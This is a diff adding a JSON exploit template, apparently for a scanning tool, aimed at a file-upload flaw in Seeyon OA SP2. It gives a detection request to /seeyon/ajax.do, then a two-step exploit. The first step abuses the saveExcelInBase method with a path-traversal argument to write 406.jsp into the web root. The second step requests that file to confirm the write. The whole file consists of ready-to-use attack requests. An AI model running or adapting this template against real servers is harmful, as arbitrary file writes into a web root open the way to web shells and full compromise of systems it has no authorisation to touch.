@@ -1,0 +1,39 @@
+{
+  "name":"致远sp2文件上传",
+  "tag":"zhiyuan",
+  "type":"upload",
+  "poc": {
+    "pocGet": "/seeyon/ajax.do;JSESSIONID=9013E76D97A1601201720C5AB57F7CBE",
+    "pocPost": "id=1",
+    "header": {
+      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
+      "content-type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Linux;"
+    },
+    "status_code":"200",
+    "pattern": "(java.lang.NullPointerException:null)"
+  },
+  "exp": {
+    "step1": {
+      "expGet": "/seeyon/ajax.do;JSESSIONID=9013E76D97A1601201720C5AB57F7CBE",
+      "expPost": "managerMethod=saveExcelInBase&managerName=fileToExcelManager&method=ajaxAction&arguments=[\"../webapps/ROOT/406.jsp\", \"\", %7b%22%63%6f%6c%75%6d%6e%4e%61%6d%65%22%3a%20%5b%27%6c%6c%7a%6e%62%21%0a%27%5d%7d]",
+      "header": {
+        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
+        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
+        "User-Agent": "Mozilla/5.0 (Linux;"
+      },
+      "status_code":"200",
+      "pattern": "()"
+    },
+    "step2": {
+      "expGet": "/406.jsp",
+      "header": {
+        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
+        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
+        "User-Agent": "Mozilla/5.0 (Linux;"
+      },
+      "status_code":"200",
+      "pattern": "()"
+    }
+  }
+}
